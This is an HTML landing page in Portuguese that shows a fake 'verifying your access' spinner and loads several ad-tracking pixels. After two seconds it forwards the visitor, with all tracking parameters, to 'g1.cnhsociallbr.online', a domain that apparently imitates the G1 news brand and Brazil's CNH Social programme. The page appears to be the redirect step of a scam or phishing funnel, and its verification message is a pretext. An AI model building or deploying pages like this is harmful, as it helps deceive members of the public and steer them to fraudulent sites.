<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Verificando Acesso...</title>

  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #ffffff;
      color: #000000;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    .loader {
      border: 8px solid #888787;
      border-top: 8px solid #FF0000;
      border-radius: 50%;
      width: 70px;
      height: 70px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    h1 {
      text-align: center;
      margin: 0;
      font-size: 20px;
    }
  </style>

  <!-- UTMify -->
  <script
    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
    data-utmify-prevent-xcod-sck
    data-utmify-prevent-subids
    async
    defer
  ></script>

  <!-- Pixel 1 -->
  <script>
    window.pixelId = "686eff0223afdf0949f6aae2";
    var a = document.createElement("script");
    a.async = true;
    a.defer = true;
    a.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
    document.head.appendChild(a);
  </script>

  <!-- Pixel 2 -->
  <script>
    window.pixelId = "687ef78d6f9546a84c5bbd23";
    var a = document.createElement("script");
    a.async = true;
    a.defer = true;
    a.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
    document.head.appendChild(a);
  </script>

  <!-- Google Pixel -->
  <script>
    window.googlePixelId = "6882ea4694839a43bee6100a";
    var a = document.createElement("script");
    a.async = true;
    a.defer = true;
    a.src = "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js";
    document.head.appendChild(a);
  </script>

</head>
<body>

  <div class="loader"></div>
  <h1>Verificando seu acesso...<br>Aguarde</h1>

  <script>
    // Redireciona após 2 segundos mantendo TODAS as UTMs e parâmetros
    setTimeout(function () {
      window.location.href =
        "https://g1.cnhsociallbr.online" + window.location.search;
    }, 2000);
  </script>

</body>
</html>
